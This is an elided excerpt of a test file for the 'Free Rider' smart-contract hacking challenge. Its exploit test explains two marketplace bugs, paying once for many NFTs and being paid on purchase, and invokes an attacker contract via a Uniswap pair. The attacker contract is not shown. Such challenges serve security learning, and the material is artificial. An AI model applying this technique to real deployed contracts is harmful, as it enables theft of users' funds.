...
describe('[Challenge] Free Rider', function () {
    ...
    it('Exploit', async function () {
        ...
        //Two bugs:
        //1. buyMany allows you to buy multiple NFTs with same amount of ETH
        //2. buyOne transfers the nft and then pays the owner of that nft so you get paid to buy it
        const freeRiderAttacker = await (await ethers.getContractFactory('FreeRiderAttacker', deployer)).deploy(
            this.weth.address,
        ...
        await freeRiderAttacker.connect(attacker).exploit(this.uniswapPair.address, NFT_PRICE)
    });
